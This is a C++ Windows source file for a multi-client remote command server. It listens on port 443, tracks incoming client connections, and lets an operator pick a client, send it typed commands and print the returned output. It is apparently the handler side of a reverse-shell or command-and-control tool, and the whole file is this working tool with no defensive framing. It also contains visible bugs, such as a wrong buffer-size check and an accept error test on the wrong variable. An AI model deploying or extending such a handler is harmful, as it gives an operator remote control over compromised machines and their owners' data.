#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>
#include <thread>
#include <map>
#include <mutex>
#include <string>

#pragma comment(lib, "ws2_32.lib")

std::string getClientIPAddress(SOCKET socket) {
	sockaddr_in clientAddr;
	int addrLen = sizeof(clientAddr);
	getpeername(socket, reinterpret_cast<sockaddr*>(&clientAddr), &addrLen);
	char ipBuffer[INET_ADDRSTRLEN];
	inet_ntop(AF_INET, &(clientAddr.sin_addr), ipBuffer, INET_ADDRSTRLEN);
	return ipBuffer;
}

void printHelp() {
	std::cout << "Available commands:\n";
	std::cout << "  list                List all connected clients\n";
	std::cout << "  connect <id>        Connect to a client with the specified ID\n";
	std::cout << "  kill <id>           Kill the connection with the specified ID\n";
	std::cout << "  help                Show this helpp message\n";
	std::cout << "  exit                Exit the server\n\n";
}

bool recieveResponse(SOCKET socket, std::string& response) {
	char buffer[4096];
	int bytesRead;
	response.clear();

	fd_set readSet;
	FD_ZERO(&readSet);
	FD_SET(socket, &readSet);

	struct timeval timeout;
	timeout.tv_sec = 5;
	timeout.tv_usec = 0;

	//wait for respnse with timeout
	int selectResult = select(socket + 1, &readSet, nullptr, nullptr, &timeout);
	if (selectResult == SOCKET_ERROR) {
		std::cerr << "select failed with an error: " << WSAGetLastError() << '\n';
		return false;
	}
	else if (selectResult == 0) {
		std::cerr << "Timeout: No respnse received from the client.\n";
		return false;
	}

	do {
		bytesRead = recv(socket, buffer, sizeof(buffer) - 1, 0);
		if (bytesRead > 0) {
			buffer[bytesRead] = '\0';
			response += buffer;
		}
	} while (bytesRead == sizeof(buffer - 1));
	return true;
}

int main() {
	std::map<int, SOCKET> clients;
	int nextId = 1;
	std::mutex clientsMutex;
	WSADATA wsaData;

	printHelp();

	int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (result != 0) {
		std::cerr << "WSAStartup fialed with error: " << result << '\n';
		return 1;
	}

	struct addrinfo* addr = nullptr;
	struct addrinfo hints;

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	result = getaddrinfo(nullptr, "443", &hints, &addr); //listen on port 443
	if (result != 0) {
		std::cerr << "getaddrinfo failed with error: " << result << '\n';
		WSACleanup();
		return 1;
	}

	SOCKET listenSocket = socket(addr->ai_family, addr->ai_socktype, addr->ai_protocol);
	if (listenSocket == INVALID_SOCKET) {
		std::cerr << "socket failed with error: " << WSAGetLastError() << '\n';
		freeaddrinfo(addr);
	}

	result = bind(listenSocket, addr->ai_addr, static_cast<int>(addr->ai_addrlen));
	if (result == SOCKET_ERROR) {
		std::cerr << "socket failed with error: " << WSAGetLastError() << '\n';
		freeaddrinfo(addr);
		closesocket(listenSocket);
		WSACleanup();
		return 1;
	}

	freeaddrinfo(addr);

	result = listen(listenSocket, SOMAXCONN);
	if (result == SOCKET_ERROR) {
		std::cerr << "socket failed with error: " << WSAGetLastError() << '\n';
		closesocket(listenSocket);
		WSACleanup();
		return 1;
	}

	std::thread([&clients, &clientsMutex]() {
		std::string command;
		while (true) {
			std::cout << "server> ";
			std::getline(std::cin, command);

			if (command == "list") {
				std::lock_guard<std::mutex> lock(clientsMutex); //lock while acccessing clients map
				for (const auto& client : clients) {
					int clientId = client.first;
					SOCKET socket = client.second;
					std::string ipAddress = getClientIPAddress(socket);
					std::cout << clientId << ". " << ipAddress << '\n';
				}
			}
			else if (command.substr(0, 7) == "connect") {
				int clientId = std::stoi(command.substr(8));
				std::lock_guard<std::mutex> lock(clientsMutex);
				if (clients.count(clientId) > 0) {
					SOCKET socket = clients[clientId];
					std::cout << "Connecting to client " << clientId << "...\n";
					std::cout << "Connected to client " << clientId << ", type 'exit' to disconnect.\n";
					std::string command;
					std::string response;
					while (true) {
						std::cout << "client " << clientId << "> ";
						std::getline(std::cin, command);
						if (command == "exit") {
							break;
						}
						command += "\n";
						send(socket, command.c_str(), static_cast<int>(command.size()), 0);

						//receive response form the client with timeout
						if (recieveResponse(socket, response)) {
							std::cout << response;
						}
						else {
							std::cout << "Noresponse received form the client.\n";
						}
					}
				}
				else {
					std::cout << "No client with ID " << clientId << '\n';
				}
			}
			else if (command.substr(0, 4) == "kill") {
				int clientId = std::stoi(command.substr(5));
				std::lock_guard<std::mutex> lock(clientsMutex);
				if (clients.count(clientId) > 0) {
					closesocket(clients[clientId]);
					clients.erase(clientId);
				}
				else {
					std::cout << "No client with Id" << clientId << '\n';
				}
			}
			else if (command == "help") {
				printHelp();
			}
			else if (command == "exit") {
				std::cout << "Exiting server...\n";
				break;
			}
			else {
				std::cout << "Unknown command: " << command << '\n';
			}
		}
		}).detach();

		while (true) {
			SOCKET clientSocket = accept(listenSocket, nullptr, nullptr);
			if (result == INVALID_SOCKET) {
				std::cerr << "accept failed with error: " << WSAGetLastError() << '\n';
				closesocket(listenSocket);
				WSACleanup();
				return 1;
			}

			std::cout << "A new connection was established.\n";
			std::cout << "server>";
			std::thread([clientSocket, &clients, &nextId, &clientsMutex]() {
				int clientId;
				{
					std::lock_guard<std::mutex> lock(clientsMutex);
					clientId = nextId++;
					clients[clientId] = clientSocket;
				}

				std::cout << "Accepted connection from client " << clientId << '\n';
				std::cout << "server>";
				}).detach();
		}

		closesocket(listenSocket);
		WSACleanup();
		return 0;
}